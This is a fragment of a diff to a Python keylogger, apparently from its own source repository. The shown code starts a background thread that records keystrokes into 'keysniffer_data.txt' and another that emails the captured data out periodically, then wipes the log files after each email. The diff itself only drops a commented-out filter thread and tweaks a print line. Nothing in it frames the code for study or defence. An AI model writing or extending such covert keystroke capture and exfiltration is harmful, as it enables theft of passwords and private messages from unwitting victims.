@@ -225,7 +225,7 @@ def reset_files_after_email(files):
         with open(file, "w") as f:
             f.truncate(0)
     print("Files have been reset.")
-    print("                        ")
+    print("                      ")
 
 
 # ===================================================== Running the Program ======================================================
@@ -237,15 +237,9 @@ if __name__ == "__main__":
     if check_and_create_file("valuable_info.txt", "keysniffer_data.txt"):
         try:
             keylogger_thread = threading.Thread(target=keylogger, daemon=True)
-            # filter_thread = threading.Thread(
-            #    target=extract_valuable_info,
-            #    args=("keysniffer_data.txt", "valuable_info.txt"),
-            #    daemon=True,
-            # )
             email_thread = threading.Thread(target=send_email_periodically, daemon=True)
 
             keylogger_thread.start()
-            # filter_thread.start()
             email_thread.start()
 
             # Keep the main program alive
